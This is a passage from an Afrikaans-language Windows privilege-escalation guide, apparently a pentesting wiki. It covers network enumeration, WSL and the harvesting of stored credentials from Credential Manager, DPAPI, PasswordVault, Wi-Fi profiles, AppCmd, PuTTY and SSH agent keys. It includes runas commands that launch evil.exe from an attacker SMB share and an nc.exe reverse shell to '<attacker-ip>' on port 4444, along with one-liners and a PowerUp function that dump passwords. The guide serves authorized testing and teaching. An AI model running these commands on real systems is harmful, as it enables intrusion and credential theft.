- Sluit alle runtime-afhanklikhede in produksie in en oudit die gebruik van `optionalDependencies`.
- Gaan derdeparty-kode na vir stil `try { require("...") } catch {}`-patrone.
- Deaktiveer opsionele probes wanneer die biblioteek dit ondersteun (byvoorbeeld, sommige `ws`-implementerings kan die verouderde `utf-8-validate`-probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Netwerk

### Gedeelde vouers

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-lêer

Kyk of daar ander bekende rekenaars in die hosts-lêer hardgekodeer is.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netwerkkoppelvlakke en DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Oop poorte

Kyk van buite af vir **beperkte dienste**

```bash
netstat -ano #Opened ports?
```

Vir ’n plaaslike listener, korreleer sy PID met die proses-eienaar, uitvoerbare lêer se pad en enige diens of geskeduleerde taak wat dit begin. ’n Afstandbehe diens kan slegs toegang as sy desktop-gebruiker bied indien sy verifikasie- en opdragbeheer dit toelaat. ’n Pasgemaakte TCP-toepassing wat as ’n rekening met hoër voorregte loop, is ’n afsonderlike teiken vir ondersoek: die listener en binêre pad is passiewe leidrade, terwyl ’n geverifieerde geheuekorrupsieroete ontleding van daardie presiese binêre lêer en sy bereikbare invoer vereis. As ’n blootgestelde poort aan ’n stelselproses behoort, vergelyk dit met [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) voordat jy die backend-diens identifiseer; ’n aanstuurreël alleen bewys nie dat die bestemming bereikbaar of kwesbaar is nie.

### Roeteringstabel

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-tabel

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-reëls

[**Kyk op hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer [opdragte vir netwerk-enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die binary `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry, kan jy op enige poort luister (die eerste keer dat jy `nc.exe` gebruik om op ’n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Om bash maklik as root te begin, kan jy `--default-user root` probeer.

Jy kan die `WSL`-lêerstelsel verken in die vouer `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` binne WSL verleen nie vanself Windows-administrateurregte nie. As die huidige Windows-identiteit ’n verspreiding se lêerstelsel kan lees, gaan dopgeskiedenislêers (insluitend `/root/.bash_history`) na vir opdragte waarin geloofsbriewe moontlik aangeteken is; eskalasie vereis steeds ’n geldige rekening met hoër voorregte en ’n toegelate verifikasiepad. Die `LocalState\rootfs`-uitleg geld vir ouer WSL-installasies; WSL 2 stoor die verspreiding gewoonlik in ’n [`ext4.vhdx` virtuele skyf](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dus moet jy eers die werklike verspreiding en bergingspad bepaal. Vermy dit om geskiedenisinhoud tydens outomatiese enumerasie uit te druk.

## Windows-geloofsbriewe

### Winlogon-geloofsbriewe

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandel `DefaultUserName` en `DefaultDomainName` as rekeningkonteks, nie as geloofsbriewe nie. ’n Nie-leë `DefaultPassword`- of `AltDefaultPassword`-waarde is ’n plaintext-registerbevinding. As `AutoAdminLogon=1` is, maar geen plaintext-wagwoord leesbaar is nie, is dit slegs ’n leidraad: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), en gewone registerlesings bevestig nie of daardie geheim bestaan of verkry kan word nie. Gaan toegangsregte en die werklike aanmeldkonfigurasie na voordat jy ’n blootstelling van geloofsbriewe rapporteer.

### Credential Manager / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault stoor gebruikers se geloofsbriewe vir bedieners, webwerwe en ander programme wat **Windows** kan gebruik om **gebruikers outomaties aan te meld**. Aanvanklik klink dit dalk asof gebruikers geloofsbriewe vir webwerwe soos Facebook, Twitter of Gmail kan stoor en blaaiers outomaties kan laat aanmeld, maar dis nie hoe dit werk nie.

Windows Vault stoor geloofsbriewe waarmee Windows gebruikers outomaties kan aanmeld. Dit beteken dat enige **Windows-toepassing wat geloofsbriewe nodig het om toegang tot ’n hulpbron te kry** (’n bediener of webwerf), **hierdie Credential Manager** en Windows Vault kan gebruik en die verskafte geloofsbriewe kan gebruik, in plaas daarvan dat gebruikers elke keer die gebruikersnaam en wagwoord moet invoer.

Tensy die toepassings met Credential Manager kommunikeer, dink ek nie dit is moontlik vir hulle om die geloofsbriewe vir ’n gegewe hulpbron te gebruik nie. As jou toepassing dus die vault wil gebruik, moet dit op die een of ander manier **met die credential manager kommunikeer en die geloofsbriewe vir daardie hulpbron** uit die verstekbergingsvault aanvra.

Gebruik `cmdkey` om die gestoorde geloofsbriewe op die masjien te lys.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde geloofsbriewe te gebruik. Die volgende voorbeeld roep ’n afgeleë binêre lêer via ’n SMB-share aan.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Gebruik `runas` met 'n verskafte stel aanmeldbewyse.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Let daarop dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of die [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP-toepassings, Microsoft Edge en moderne stelseldienste stoor verifikasietokens en gewone tekswagwoorde in die Universal Windows Platform (UWP) `PasswordVault` (ook as `Web Credentials` in `vaultcmd` beskikbaar). Hierdie stoorspasie is sessiegeïsoleer en kan natively gedekripteer word sonder administratiewe regte of `SeDebugPrivilege`.

Voer hierdie PowerShell-opdrag binne die gebruiker se aktiewe sessie uit om onmiddellik alle gestoorde gebruikersname en gewone tekswagwoorde te dump en te dekripteer:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bied ’n metode vir simmetriese enkripsie van data, wat hoofsaaklik binne die Windows-bedryfstelsel gebruik word vir die simmetriese enkripsie van asimmetriese private sleutels. Hierdie enkripsie benut ’n gebruiker- of stelselgeheim om beduidend tot die entropie by te dra.

**DPAPI maak dit moontlik om sleutels te enkripteer met ’n simmetriese sleutel wat van die gebruiker se aanmeldgeheime afgelei word**. In gevalle waar stelselenkripsie betrokke is, gebruik dit die stelsel se domeinstawingsgeheime.

Geënkripteerde gebruiker-RSA-sleutels wat DPAPI gebruik, word in die `%APPDATA%\Microsoft\Protect\{SID}`-gids gestoor, waar `{SID}` na die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verwys. **Die DPAPI-sleutel, wat saam met die hoofsleutel in dieselfde lêer geleë is en die gebruiker se private sleutels beskerm**, bestaan tipies uit 64 grepe ewekansige data. (Let daarop dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud daarvan met die `dir`-opdrag in CMD gelys word, hoewel dit wel deur PowerShell gelys kan word.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te dekripteer.

Die **credential-lêers wat deur die hoofwagwoord beskerm word** is gewoonlik hier geleë:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te dekripteer.\
Jy kan baie **DPAPI** **masterkeys** met die `sekurlsa::dpapi` module uit **memory** onttrek (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels vir **scripting** en outomatiseringstake gebruik as ’n manier om geënkripteerde credentials gerieflik te stoor. Die credentials word met **DPAPI** beskerm, wat gewoonlik beteken dat net dieselfde gebruiker op dieselfde rekenaar waarop dit geskep is, hulle kan dekripteer.

’n Uitgevoerde credential kan ’n arbitrêre lêernaam of `.xml`-pad hê. Wanneer ’n script of lêerinventaris na een verwys, bepaal die rekening se werklike profielgids eerder as om `C:\Users` te veronderstel: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). ’n Leesbare lêer is slegs ’n leidraad; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), en enige herwonne rekening moet afsonderlik geldige regte op die beoogde diens hê. Inspekteer eers paaie en ACL’s, sonder om geënkripteerde of gewone tekswaardes tydens roetine-enumerasie te vertoon.

Om ’n PS credential uit die lêer wat dit bevat te **dekripteer**, kan jy die volgende doen:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gestoorde RDP-verbindings

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Onlangs uitgevoerde opdragte

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Bestuurder vir geloofsbriewe vir afgeleë werkskerm**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Gebruik die **Mimikatz** `dpapi::rdg`-module met die toepaslike `/masterkey` om **enige .rdg-lêers te dekripteer**\
Jy kan **baie DPAPI-masterkeys** uit geheue onttrek met die Mimikatz `sekurlsa::dpapi`-module

**mRemoteNG gebruik ’n ander verbindingstoor.** Ondersoek leesbare XML in `%APPDATA%\mRemoteNG` en gebruiker se Documents, insluitend lêers met gewone name soos `config.xml`. Identifiseer die verbinding-skema en geënkripteerde `Password`-attribute voordat jy ’n XML-lêer as ’n leidraad na geloofsbriewe beskou. Die gestoorde waarde is nie ’n DPAPI/RDCMan-wagwoord nie; herstel hang af van die lêer se enkripsie-instellings en of ’n pasgemaakte hoofwagwoord gebruik is. Moenie geënkripteerde waardes druk tydens breë enumerasie nie.

**Remote Desktop Plus-profieluitvoere** kan ook leesbaar wees in gebruikersgidse of ’n gedeelde administrasiegids. ’n Ouer `profiles.xml`-uitvoer het `Data/Profile`-inskrywings met `ProfileName`-, `Password`- en `Secure`-elemente. Beskou ’n nie-leë wagwoordelement as ’n leidraad na geloofsbriewe, sonder om dit te druk of aan te neem dat dit gewone teks is: [die verskaffer se notas](https://www.donkz.nl/) sê dat profielbeskerming aan die rekening en rekenaar wat dit geskep het gekoppel kan wees, of minder streng ingestel kan word. Bevestig die lêer se oorsprong en herstelvoorwaardes voordat jy daarop staatmaak.

### Plaknotas

Mense stoor soms wagwoorde en ander inligting in plaknotas-toepassings. Microsoft se verpakte Sticky Notes-toepassing stoor notas gewoonlik by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ouer of ander toepassings gebruik moontlik ander gebruikerprofiel-stoorplekke, insluitend LevelDB. Bepaal watter toepassing geïnstalleer is en watter stoorformaat dit gebruik voordat jy die afwesigheid van ’n SQLite-lêer as afwesigheid van notas beskou.

As Sticky Notes SQLite write-ahead logging gebruik, kan ’n kopie van slegs `plum.sqlite` onlangse vasgelegde notas weglaat. Hou die ooreenstemmende `plum.sqlite-wal` saam met ’n konsekwente kopie van die databasis, en sluit `plum.sqlite-shm` in wanneer dit beskikbaar is; die gedeeldegeheue-indeks kan herbou word, maar die WAL is deel van die databasis se volgehoue toestand. Sien [SQLite se WAL-dokumentasie](https://www.sqlite.org/wal.html). ’n Nota met ’n rekeningnaam of wagwoord is slegs ’n leidraad na geloofsbriewe: verifieer die rekening, toegelate toegang en hergebruik van die wagwoord afsonderlik. ’n Geënkripteerde wagwoordbestuurderrekord vereis boonop die werklike dekripsiesleutel en toepassingspesifieke interpretasie voordat dit ’n aanmelding met hoër voorregte kan bevestig.

### AppCmd.exe

**Let daarop dat jy ’n Administrator moet wees en onder ’n High Integrity-vlak moet werk om wagwoorde uit AppCmd.exe te herstel.**\
**AppCmd.exe** is in die `%systemroot%\system32\inetsrv\`-gids.\
As hierdie lêer bestaan, is dit moontlik dat sommige **geloofsbriewe** opgestel is en **herwin** kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Kyk of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installeerders word **met SYSTEM-voorregte uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Lêers en register (aanmeldbesonderhede)

### Geloofsbriefartefakte in register van ondersteuningsnutsmiddels

Sommige ouer afstandondersteuningsinstallasies behou wagwoordverwante waardename onder vaste toepassingsregistersleutels. Byvoorbeeld, TeamViewer se `SecurityPasswordAES` het in weergawes voor 9 ’n ingestelde statiese sessiewagwoord aangedui, volgens die [verskaffer se verduideliking van die registersleutel](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). ’n Waardenaammerker is slegs ’n leidraad vir ondersoek: verifieer die geïnstalleerde weergawe, leesbare waardedata, formaat en huidige verifikasiegedrag voordat jy daardie aanmeldbesonderheid beoordeel. Om van ’n afstandondersteuningswagwoord na ’n meer bevoorregte Windows-rekening oor te skakel, vereis ook dat die wagwoord werklik hergebruik word en dat toegang tot daardie rekening gemagtig is. Moenie syferteks of herwonne wagwoorde by roetine-opname-uitvoer insluit nie.

### Gedeelde sigblaaie met beskermde werkblaaie

As daar vermoed word dat ’n leesbare gedeelde werkboek rekeningdata bevat, onderskei **lêerenkripsie** van werkbladbeskerming of versteekte kolomme. [Microsoft sê](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) dat werkbladbeskerming wysigings beheer en nie ’n sekuriteitsfunksie is nie; dit bewys op sigself nie dat die werkboekinhoud geënkripteer is nie. Ondersoek slegs lêers wat gemagtig en relevant is, en vermy die uitdruk van moontlike geheime tydens breë opname. ’n Leesbare `.xlsx`-pad, ’n beskermde werkblad of ’n versteekte kolom bewys op sigself nie dat aanmeldbesonderhede bestaan of dat enige rekening hoër voorregte het nie; verifieer die werklike data en huidige rekeningregte afsonderlik.

### CI-bediener se behoue veranderingspatches

’n CI-bediener kan ingediende bronkodeveranderings in sy datagids behou selfs nadat die bouproses voltooi is. [TeamCity beskryf](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` as berging vir afstand-uitgevoerde veranderings; die datagids kan gekonfigureer word en is nie noodwendig onder `ProgramData` nie. ’n Leesbare patch kan verwysings na ’n aanmeldbesonderhedelêer, ’n enkripsiesleutel of ’n skrip wat albei gebruik, behou—selfs as daardie verwysings verwyder of bygevoeg is. Byvoorbeeld, ’n PowerShell-werkvloei met `ConvertTo-SecureString -Key` benodig die AES-sleutel sowel as die geënkripteerde string; [Microsoft beskryf](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) dat die sleutel afsonderlik verskaf word. Ondersoek eers slegs toeganklike patchname, en besigtig dan relevante inhoud met magtiging, sonder om geheime by roetine-opname-uitvoer in te sluit. ’n Patchpad, ’n geënkripteerde waarde of ’n sleutelverwysing bewys op sigself nie dat aanmeldbesonderhede geldig is of dat toegang met hoër voorregte moontlik is nie. Beperk die datagids se ACL’s en vermy dit om geheime by bouveranderings in te sluit.

### Pasgemaakte rotasie van plaaslike administrateurwagwoorde

’n Selfgemaakte wagwoordroteerder kan ’n geënkripteerde plaaslike administrateurwagwoord in ’n plaaslike diens stoor, terwyl dit sy datastoor-aanmeldbesonderhede in ’n leesbare `.env`-lêer of langs die bywerkingsprogram se binêre lêer hou. Ondersoek die bywerkskeduleerdertaak, rekening, konfigurasie-ACL’s, luisteraar en datastoorregte saam. ’n Datastoor wat slegs aan die loopback-koppelvlak gekoppel is, is steeds bereikbaar vir ’n plaaslike gebruiker met geldige aanmeldbesonderhede, maar verifikasie alleen bewys nie dat die gebruiker die toepaslike rekords mag lees nie. As die enkripsiesaad of sleutelmateriaal langs die syferteks toeganklik is, ondersoek die presiese sleutelafleiding voordat jy die enkripsie vertrou. ’n Skema wat ’n AES-sleutel deterministies uit ’n blootgestelde saad met Go se [`math/rand`](https://pkg.go.dev/math/rand) aflei, is ongeskik om daardie wagwoord te beskerm; Go beskryf daardie pakket as ongeskik vir sekuriteitsensitiewe ewekansigheid. Bevestig dat enige herwonne wagwoord tans geldig is en aan ’n rekening in die plaaslike Administrators-groep behoort voordat jy dit as ’n eskalasiepad beskou. ’n Geskeduleerde taak, `.env`-pad of geënkripteerde blob bewys nie een van hierdie voorwaardes nie. Moenie wagwoorde of sleutelmateriaal by roetine-opname-uitvoer insluit nie.

Gebruik [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) vir bestuurde plaaslike administrateurwagwoorde. Die gids- of Entra-ondersteunde berging en toegangsbeheer daarvan verskil van dié van ’n pasgemaakte plaaslike datastoor; [Elasticsearch-rolle](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) bepaal eweneens of ’n geverifieerde datastoorgebruiker ’n spesifieke indeks kan lees.

### Java-bedienerinpropargiewe en hergebruik van aanmeldbesonderhede

Sommige Java-bedienerinproppe word as JAR-argiewe in ’n bediener se `plugins`-gids versprei. ’n Leesbare pasgemaakte inprop kan konfigurasie of bytecode met ’n ingebedde diensaanmeldbesonderheid bevat. Ondersoek die argief slegs indien gemagtig, en moenie herwonne geheime by roetine-opname-uitvoer insluit nie. ’n Inprop-pad bewys op sigself nie dat ’n geheim bestaan nie, en ’n herwonne dienswagwoord lei slegs tot hoër voorregte as dit ook vir ’n meer bevoorregte rekening geldig is. Gaan die toepaslike lêer-ACL’s na en vervang hergebruikte aanmeldbesonderhede met unieke geheime. Sien [PaperMC se installasiegids vir inproppe](https://docs.papermc.io/paper/adding-plugins/) vir die gidsuitleg en [Oracle se JAR-dokumentasie](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) vir argiefinhoud.

### Openfire-ingebedde databasisaanmeldbesonderhede

’n Openfire-installasie wat sy ingebedde databasis gebruik, kan `openfire.script` onder `Openfire\embedded-db` hou. As die huidige rekening dit kan lees, ondersoek die `OFUSER`-rekords en die `passwordKey`-eienskap saam. Openfire se [dokumentasie oor gebruikersverskaffers](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) meld dat wagwoorde as gewone teks gestoor of geënkripteer kan word met ’n sleutel wat in daardie eienskap gehou word. ’n Herwonne wagwoord is slegs relevant vir eskalasie as dit steeds vir ’n identiteit met hoër voorregte geldig is; die lêernaam bewys nóg leestoegang nóg hergebruik van aanmeldbesonderhede. Die pad is ’n leidraad vir inventarisering, dus moenie databasisinhoud of aanmeldbesonderhede by roetine-opname-uitvoer insluit nie.

Die afsonderlike `Openfire\conf\openfire.xml`-lêer kan die admin-konsole se gekonfigureerde poorte en bindingskoppelvlak onthul, selfs wanneer ’n eksterne databasis gebruik word. Openfire bind sy admin-konsole gewoonlik aan loopback; ’n plaaslike rekening kan steeds daardie adres bereik as die luisteraar loop. Gaan die werklike luisteraar, gemagtigde admin-rol, beleid vir die oplaai van inproppe en Openfire-diensidentiteit saam na. ’n Admin wat ’n inprop kan installeer, kan inpropkode in die diens se konteks laat loop; dit kan hoë voorregte hê wanneer die diens as LocalSystem loop. ’n Ooreenstemmende rekeningwagwoord of leesbare konfigurasiepad bewys op sigself nie toegang tot die admin-konsole of kode-uitvoering nie. Sien die verskaffer se [gids vir installasie en inpropbestuur](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) en [API-eienskap vir die oplaai van inproppe](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfigurasie van forensiese bestuursbediener

Velociraptor-bedienerkonfigurasies, wat gewoonlik `server.config.yaml` genoem word, kan die interne CA se `CA.private_key` bevat. As ’n gebruiker met laer voorregte daardie sleutel kan lees, kan hulle moontlik ’n API-kliëntsertifikaat skep. Of dit tot hoër voorregte lei, hang af van die bediener se gebruikersrolle, API-bereikbaarheid en die identiteit waaronder die bediener of teikenagent loop. ’n Kliëntkonfigurasie bevat ander materiaal; om een te vind, bewys nie toegang tot die bediener-CA nie. Sommige ontplooiings hou die CA-private sleutel vanlyn, dus kan ’n leesbare bedienerkonfigurasie ook sonder die ondertekeningsleutel wees.

Gaan op ’n Windows-bediener die ACL van die **bediener**-konfigurasie in sy installasiegids en enige beskermde rugsteunkopieë na. Een moontlike ligging is `%ProgramFiles%\VelociraptorServer\server.config.yaml`; gebruik die diens se gekonfigureerde pad indien dit verskil. Bevestig dat die huidige identiteit die lêer kan lees en dat `CA.private_key` werklik teenwoordig is. Moenie die private sleutel in logs of opname-uitvoer druk nie. Die verskaffer se `config api_client`-werkvloei gebruik die CA-sleutel om ’n kliëntsertifikaat uit te reik, maar ’n toepaslike bedienerkantrol is ook nodig; om een te skep of te verander, kan datastoor-skryftoegang of ’n herbegin vereis. ’n Bestaande bevoorregte bedieneridentiteit kan ’n pad bied selfs wanneer daardie skryfbewerkings nie moontlik is nie. API-navrae met uitvoeringsregte loop in die toepaslike bediener- of agentkonteks, wat hoë voorregte kan hê.

Beskerm die bedienerkonfigurasie en rugsteunkopieë met beperkende ACL’s, hou die CA-ondertekeningsleutel waar moontlik vanlyn, en beperk API-rolle en luisteraartoegang. Sien die [Velociraptor API-dokumentasie](https://docs.velociraptor.app/docs/server_automation/server_api/) en [riglyne vir sekuriteitskonfigurasie](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-aanmeldbesonderhede

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY is ’n aparte sessiebestuurder. Die oorspronklike geënkripteerde berging kan by `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` wees, terwyl ’n uitgevoerde sessierugsteun `sessions-backup.dat` kan heet en elders gestoor kan wees. [SolarWinds se uitvoergids](https://thwack.solarwinds.com/discussion/comment/115591) sê dat uitvoere met ’n wagwoord geënkripteer word en sessies, sleutels, skrifte, etikette en verwantskappe kan bevat; hul [ondersteuningsforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifiseer die oorspronklike berging. Gaan eers lêertoestemmings en paaie na. Om een van die lêers te vind, verklap nie die wagwoord nie en bewys ook nie dat enige gestoorde aanmeldbesonderhede steeds geldig is of hoër voorregte het nie.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-sleutels in die register

SSH-privaat sleutels kan in die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, so jy moet kyk of daar iets interessants daarin is:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

As jy enige inskrywing binne daardie pad vind, is dit waarskynlik ’n gestoorde SSH-sleutel. Dit word geënkripteer gestoor, maar kan maklik gedekripteer word met [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek is hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties met opstart begin, voer uit:

```bash
